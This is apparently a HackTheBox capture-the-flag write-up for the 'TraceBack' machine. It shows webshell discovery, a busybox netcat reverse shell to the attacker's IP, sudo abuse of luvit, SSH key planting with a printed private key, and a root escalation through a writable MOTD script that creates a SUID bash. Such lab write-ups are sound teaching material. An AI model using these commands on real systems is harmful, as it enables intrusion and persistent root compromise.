# HTB - TraceBack

### Ip: 10.129.245.136
### Name: TraceBack
### Rating: Easy

------------------------------------------------

![TraceBack.png](../assets/traceback_assets/TraceBack.png)

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/TraceBack]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.129.245.169
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-09 13:11 CST
Nmap scan report for 10.129.245.169
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9625518e6c830748ce114b1fe56d8a28 (RSA)
|   256 54bd467114bdb242a1b6b02d94143b0d (ECDSA)
|_  256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

Looking at the site on port 80 we find:

![htb_traceback_site.png](../assets/traceback_assets/htb_traceback_site.png)

After several failed directory fuzzing attempts using my go-to wordlists in attempt to find the webshell mentioned, I decided to try a wordlist from SecLists for common backdoors and got a hit:

![htb_traceback_dir.png](../assets/traceback_assets/htb_traceback_dir.png)

Navigating to the directory we find a login:

![htb_traceback_backdoor.png](../assets/traceback_assets/htb_traceback_backdoor.png)

Luckily for us we can successfully authenticate using `admin:admin`

![htb_traceback_in.png](../assets/traceback_assets/htb_traceback_in.png)

### Exploitation

Clicking on the console tab we find we can execute commands:

![htb_traceback_whoami](../assets/traceback_assets/htb_traceback_whoami.png)

Let's issue a reverse shell oneliner to catch a reverse shell:
```
busybox nc 10.10.14.166 443 -e /bin/bash
```

This catches us a shell back in our listener as user webadmin:

```
┌──(ryan㉿kali)-[~/HTB/TraceBack]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.166] from (UNKNOWN) [10.129.245.169] 45538
id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
hostname
traceback
python3 -c 'import pty;pty.spawn("/bin/bash")'
webadmin@traceback:/var/www/html$ ls
ls
bg.jpg  index.html  smevk.php
```

Looking in the webadmin user's home directory we find a note:

```
webadmin@traceback:/home/webadmin$ ls
note.txt
webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:/home/webadmin$ cd ..
webadmin@traceback:/home$ cd sysadmin
bash: cd: sysadmin: Permission denied
```

So looks like we'll need to find a way to move laterally to the sysadmin user here in order to get the first flag.

Running `sudo -l` we find:

```
webadmin@traceback:/home$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

We can use this to execute system commands as the user sysadmin using the `os.execute` command in luvit:

![htb_traceback_bash.png](../assets/traceback_assets/htb_traceback_bash.png)

We can now grab the first flag:

![htb_traceback_user.png](../assets/traceback_assets/htb_traceback_user.png)

### Privilege Escalation

Loading linpeas onto the target we find:

![htb_traceback_lp.png](../assets/traceback_assets/htb_traceback_lp.png)

These are writable message of the day files, which are triggered when a user SSH's into the machine.

We'll need to take a couple steps to exploit this.

First, because we don't have any credentials, we'll need to generate some SSH keys to use to trigger our malicious MOTD.

```
sysadmin@traceback:~$ cd .ssh
sysadmin@traceback:~/.ssh$ ls -la
total 8
drwxr-xr-x 2 root     root     4096 Apr 20  2021 .
drwxr-x--- 5 sysadmin sysadmin 4096 Jan  9 11:41 ..
-rw-r--r-- 1 sysadmin sysadmin    0 Apr 20  2021 authorized_keys
```

I can't directly create the keys in `/.ssh` but I can create them in `/tmp` and move them:

```
sysadmin@traceback:~/.ssh$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Saving key "id_rsa" failed: Permission denied
sysadmin@traceback:~/.ssh$ cd /tmp
sysadmin@traceback:/tmp$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:KV+ubpSAU9ZvsNMTnzQDrkNKRSs8PxWHvmdMTX1FuUI sysadmin@traceback
The key's randomart image is:
+---[RSA 2048]----+
|       oo oo.  o=|
|     .o.oooo+E..o|
|     += o*o+.*  o|
|    o..*o+* +... |
|     .o.S+.=  .  |
|       oo=. +    |
|       .. .o     |
|        ..       |
|       oo        |
+----[SHA256]-----+
sysadmin@traceback:/tmp$ cat id_rsa.pub > /home/sysadmin/.ssh/authorized_keys
sysadmin@traceback:/tmp$ cat id_rsa     
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApMCpMZZsd0acMP9dOfQ1NeYowvTiagqXWcEOF1OE4yBDVsG6
/uPTY+YYXk+vD0dtSMiWhdYfDFwsk6ZbZH0STAbNkCayFH0ATkZMczFtLTWz5ihG
RszhFyI0NxcNSgfW+cZZhD6MOjggE6vMTxPmu7/fhcUoFUIjaYxqu+7KNo0LD9c0
hDrS2ozLcCWz3HJ0FXSXevARpkyMexRow4tPMxDHPKO1EhtvK+ydK9jug9Aom4jO
/boIaPrpVp40y5moLWNenu8CKAmqhwULbAJhpOV5EcYqy3yX8eSZhE+t52lye/KS
VJZhEks4PO4UJCdKRsRwhUvmDwa6usFKFmUWDwIDAQABAoIBADdF172mLL+bdd1O
XxWJY6ywie5WP/u5j+txxGt4/rVAZrcdicHn50y1rmk9rIqguP5ZJX7DRmlcJyxl
/HVrLI9LHP4GrWoIQekA1rcy1uD7Cl7mFiW8qKudMw1kc3XpyWrE69VdMqh5mfFf
<SNIP>
```

I can then copy the id_rsa to my kali box, change modes on it, and verify it works:

```
┌──(ryan㉿kali)-[~/HTB/TraceBack]
└─$ ssh -i id_rsa sysadmin@10.129.245.169
The authenticity of host '10.129.245.169 (10.129.245.169)' can't be established.
ED25519 key fingerprint is SHA256:t2eqwvH1bBfzEerEaGcY/lX/lrLq/rpBznQqxrTiVfM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.245.169' (ED25519) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ hostname
traceback
```

Cool, now that we've done that we need to overwrite the MOTD to something of our own.

Then, back in our shell we can run:

```
echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> /etc/update-motd.d/00-header
```

And SSH in again and navigate to `/tmp` and run `./bash -p`:

```
┌──(ryan㉿kali)-[~/HTB/TraceBack]
└─$ ssh -i id_rsa sysadmin@10.129.245.169
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan  9 12:34:32 2025 from 10.10.14.166
$ cd /tmp
$ ./bash -p
bash-4.4# whoami
root
bash-4.4# hostname
traceback
```

Nice, that worked.

We can now grab the final flag:

![htb_traceback_root.png](../assets/traceback_assets/htb_traceback_root.png)

Thanks for following along!

-Ryan

----------------------------------




